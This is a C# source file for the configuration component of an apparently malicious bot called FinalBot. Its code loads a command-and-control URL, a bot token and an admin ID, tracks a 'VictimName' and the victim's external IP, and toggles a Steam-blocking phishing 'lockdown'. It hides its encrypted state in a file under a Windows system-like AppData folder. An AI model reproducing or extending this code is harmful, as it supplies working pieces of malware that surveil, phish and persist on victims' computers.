using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using VanguardCore;
using FinalBot.Modules;

namespace FinalBot
{
    public static class ConfigManager
    {
        private static Dictionary<string, string> _config = new Dictionary<string, string>();
        
        // XOR Salt for session data obfuscation
        private static readonly byte[] _sessionSalt = { 0x1A, 0x5F, 0x22, 0x4D, 0x09, 0x7E, 0x33, 0x1B };

        private static string GetConfigPath()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string folder = Path.Combine(appData, "Microsoft", "Windows", "Network");
            if (!Directory.Exists(folder)) try { Directory.CreateDirectory(folder); } catch { }
            return Path.Combine(folder, "session.dat");
        }

        private static string XD(string input) {
            if (string.IsNullOrEmpty(input)) return "";
            try {
                byte[] b = Encoding.UTF8.GetBytes(input);
                byte[] enc = ProtectedData.Protect(b, _sessionSalt, DataProtectionScope.CurrentUser);
                return Convert.ToBase64String(enc);
            } catch { return ""; }
        }

        private static string XE(string base64) {
            if (string.IsNullOrEmpty(base64)) return "";
            try {
                byte[] b = Convert.FromBase64String(base64);
                byte[] dec = ProtectedData.Unprotect(b, _sessionSalt, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(dec);
            } catch { return ""; }
        }

        public static void Load()
        {
            // [PRO] All static secrets retrieved from encrypted Vault
            _config["BOT_TOKEN"] = SafetyManager.Resolve("BOT_TOKEN_1");
            _config["ADMIN_ID"] = SafetyManager.Resolve("ADMIN_ID");
            _config["C2_URL"] = SafetyManager.Resolve("GIST_URL");
            
            _config["VictimName"] = "Unknown";
            try
            {
                string path = GetConfigPath();
                if (System.IO.File.Exists(path))
                {
                    string enc = System.IO.File.ReadAllText(path).Trim();
                    _config["VictimName"] = XE(enc);
                }
                
                string blockPath = Path.Combine(Path.GetDirectoryName(path) ?? "", "block.dat");
                if (System.IO.File.Exists(blockPath))
                {
                    string enc = File.ReadAllText(blockPath).Trim();
                    string dec = XE(enc);
                    PhishManager.GlobalBlockSteam = dec == "1";
                    if (PhishManager.GlobalBlockSteam) PhishManager.StartLockdown();
                }
            }
            catch { }
        }

        public static void Save()
        {
            try
            {
                string path = GetConfigPath();
                System.IO.File.WriteAllText(path, XD(VictimName));
                
                string blockPath = Path.Combine(Path.GetDirectoryName(path) ?? "", "block.dat");
                System.IO.File.WriteAllText(blockPath, XD(PhishManager.GlobalBlockSteam ? "1" : "0"));
            }
            catch { }
        }

        public static string VictimName 
        { 
            get => Get("VictimName", "Unknown"); 
            set 
            {
                Set("VictimName", value);
                Save();
            }
        }

        private static string _cachedIp = null;
        public static string LastKnownIp => _cachedIp ??= FinalBot.Modules.SystemInfoModule.GetExternalIP();

        public static string Get(string key, string defaultValue = "")
        {
            if (_config.TryGetValue(key, out string? value))
                return value ?? defaultValue;
            return defaultValue;
        }

        public static void Set(string key, string value)
        {
            _config[key] = value;
        }

        public static long GetLong(string key, long defaultValue = 0)
        {
            if (_config.TryGetValue(key, out string? value) && long.TryParse(value, out long result))
                return result;
            return defaultValue;
        }
    }
}
